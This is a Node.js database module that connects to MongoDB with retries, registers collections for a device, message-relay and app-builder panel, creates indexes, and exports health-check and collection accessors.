"use strict";

const { MongoClient, ObjectId, ReturnDocument } = require("mongodb");
const config = require("./config");

let _client = null;
let _db = null;
const _col = {};

const COLLECTIONS = [
  "devices",
  "messages",
  "outbox",
  "rules",
  "pairing_codes",
  "activity_logs",
  "banned_senders",
  "relay_config",
  "counters",
  "tg_logs",
  "device_events",
  "install_fingerprints",
  "panel_keys",
  "apps",
  "builds",
  "orders",
];

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const utcNow = () => new Date();

async function initDbWithRetry(tries = 30, delayMs = 2000) {
  const uri =
    process.env.MONGO_URL ||
    process.env.MONGODB_URI ||
    "mongodb://127.0.0.1:27017";

  const dbName =
    process.env.DB_NAME ||
    process.env.MONGO_DB ||
    "tpc_panel";

  let lastErr;

  for (let i = 1; i <= tries; i++) {
    try {
      _client = new MongoClient(uri, {
        serverSelectionTimeoutMS: 8000,
      });

      await _client.connect();

      _db = _client.db(dbName);

      for (const collection of COLLECTIONS) {
        _col[collection] = _db.collection(collection);
      }

      await ensureIndexes();

      return _db;
    } catch (err) {
      lastErr = err;

      try {
        await _client?.close();
      } catch (_) {}

      _client = null;
      _db = null;

      if (i < tries) {
        await sleep(delayMs);
      }
    }
  }

  throw lastErr;
}

async function ensureIndexes() {
  const jobs = [
    _col.devices.createIndex(
      { registration_id_hash: 1 },
      { unique: true, sparse: true }
    ),

    _col.messages.createIndex({
      device_id: 1,
      _id: -1,
    }),

    _col.messages.createIndex(
      { dedupe_key: 1 },
      { sparse: true }
    ),

    _col.outbox.createIndex({
      device_id: 1,
      status: 1,
    }),

    _col.panel_keys.createIndex(
      { key_hash: 1 },
      { unique: true, sparse: true }
    ),

    _col.install_fingerprints.createIndex(
      { android_id: 1 },
      {
        unique: true,
        partialFilterExpression: {
          android_id: { $type: "string" },
        },
      }
    ),

    _col.device_events.createIndex({
      created_at: -1,
    }),
  ];

  for (const job of jobs) {
    await job;
  }
}

async function checkDatabase() {
  try {
    await _db.command({ ping: 1 });

    return {
      status: "ok",
      db: _db.databaseName,
    };
  } catch (err) {
    return {
      status: "error",
      error: String(err.message || err),
    };
  }
}

async function builderStats() {
  const out = {};

  try {
    for (const collection of ["apps", "builds", "orders"]) {
      out[collection] = await _col[collection].countDocuments({});
    }
  } catch (_) {}

  return out;
}

async function closeDb() {
  try {
    await _client?.close();
  } catch (_) {}

  _client = null;
  _db = null;
}

module.exports = {
  ObjectId,
  ReturnDocument,
  utcNow,
  initDbWithRetry,
  checkDatabase,
  builderStats,
  closeDb,

  get db() {
    return _db;
  },

  get devices() {
    return _col.devices;
  },

  get messages() {
    return _col.messages;
  },

  get outbox() {
    return _col.outbox;
  },

  get rules() {
    return _col.rules;
  },

  get pairing_codes() {
    return _col.pairing_codes;
  },

  get activity_logs() {
    return _col.activity_logs;
  },

  get banned_senders() {
    return _col.banned_senders;
  },

  get relay_config() {
    return _col.relay_config;
  },

  get counters() {
    return _col.counters;
  },

  get tg_logs() {
    return _col.tg_logs;
  },

  get device_events() {
    return _col.device_events;
  },

  get install_fingerprints() {
    return _col.install_fingerprints;
  },

  get panel_keys() {
    return _col.panel_keys;
  },

  get apps() {
    return _col.apps;
  },

  get builds() {
    return _col.builds;
  },

  get orders() {
    return _col.orders;
  },
};